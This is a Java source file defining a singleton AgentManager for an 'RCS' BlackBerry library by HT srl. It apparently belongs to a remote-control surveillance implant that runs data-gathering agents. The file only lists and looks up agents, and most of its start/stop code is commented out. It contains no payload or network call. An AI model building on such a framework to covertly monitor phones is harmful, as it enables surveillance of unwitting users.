/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : AgentManager.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import java.util.Vector;

import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.event.Event;
import com.ht.rcs.blackberry.interfaces.Singleton;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.StartStopThread;
import com.ht.rcs.blackberry.utils.Utils;

/**
 * The Class AgentManager.
 */
public final class AgentManager extends Manager implements Singleton {

    /** Tempo di attesa tra il check di stop. */
    private static final int SLEEP_CHECKING_STOP = 400;

    /** The debug. */
    static Debug debug = new Debug("AgentManager", DebugLevel.VERBOSE);

    /** The instance. */
    static AgentManager instance = null;

    /**
     * Gets the single instance of AgentManager.
     * 
     * @return single instance of AgentManager
     */
    public static synchronized AgentManager getInstance() {
        if (instance == null) {
            instance = new AgentManager();
        }

        return instance;
    }

    /**
     * Instantiates a new agent manager.
     */
    private AgentManager() {
        super();
    }

   /* public boolean enabled(int id) {
        boolean valid = statusObj.isValidAgent(id);
        if (valid) {
            Agent agent = statusObj.getAgent(id);
            return agent.enabled();
        }

        return false;
    }*/

    public Vector getAllItems() {
        Check.requires(statusObj != null, "Null status");
        Vector agents = statusObj.getAgentsList();
        return agents;
    }

    public StartStopThread getItem(int id) {
        Check.requires(statusObj != null, "Null status");
        Agent agent = statusObj.getAgent(id);
        Check.ensures(agent.agentId == id, "Wrong id");

        return agent;
    }

    /*
     * public boolean running(int id) { return statusObj.agentQueryStatus(id) !=
     * Common.AGENT_RUNNING; }
     */

    /*
     * (non-Javadoc)
     * 
     * @see com.ht.rcs.blackberry.Manager#Start(int)
     */
    /*
     * public synchronized boolean startOld(int agentId) {
     * 
     * if (!enabled(agentId)) { debug.error("AgentManager Start FAILED [0] " +
     * agentId); return false; }
     * 
     * if (running(agentId)) { debug.info("AgentManager Start RUNNING" +
     * agentId); return true; }
     * 
     * // return statusObj.StartAgent(agentId); Agent agent =
     * statusObj.getAgent(agentId);
     * 
     * if (agent == null) { debug.error("Agent unknown: " + agentId); return
     * false; }
     * 
     * agent.start(); debug.trace("Start() OK"); return true;
     * 
     * }
     */

    // Qui vengono eseguiti gli agenti che funzionano come thread
    /*
     * (non-Javadoc)
     * 
     * @see com.ht.rcs.blackberry.Manager#StartAll()
     */
    /*
     * public synchronized boolean startAll() { Vector agents =
     * statusObj.getAgentsList();
     * 
     * for (int i = 0; i < agents.size(); i++) { Agent agent = (Agent)
     * agents.elementAt(i);
     * 
     * if (agent.agentStatus == Common.AGENT_ENABLED) { agent.start();
     * Utils.sleep(100); } }
     * 
     * debug.trace("StartAll() OK"); return true; }
     */
    /*
     * (non-Javadoc)
     * 
     * @see com.ht.rcs.blackberry.Manager#Stop(int)
     */
    /*
     * public synchronized int stop(int typeId) { if
     * (!statusObj.stopAgent(typeId)) {
     * debug.trace("StopAgent() Agent already stopped"); return
     * Common.AGENT_STOPPED; }
     * 
     * while (statusObj.agentQueryStatus(typeId) != Common.AGENT_STOPPED) {
     * Utils.sleep(SLEEP_CHECKING_STOP); }
     * 
     * boolean ret = statusObj.reEnableAgent(typeId); return ret ?
     * Common.AGENT_RUNNING : Common.AGENT_STOPPED; }
     */

    /*
     * (non-Javadoc)
     * 
     * @see com.ht.rcs.blackberry.Manager#StopAll()
     */
    /*
     * public synchronized int stopAll() { // Diciamo a tutti gli agenti di
     * fermarsi statusObj.stopAgents(); Vector agents =
     * statusObj.getAgentsList();
     * 
     * for (int i = 0; i < agents.size(); i++) { Agent agent = (Agent)
     * agents.elementAt(i); stop(agent.agentId); }
     * 
     * statusObj.reEnableAgents();
     * 
     * return Common.AGENT_STOPPED;
     * 
     * }
     */

}
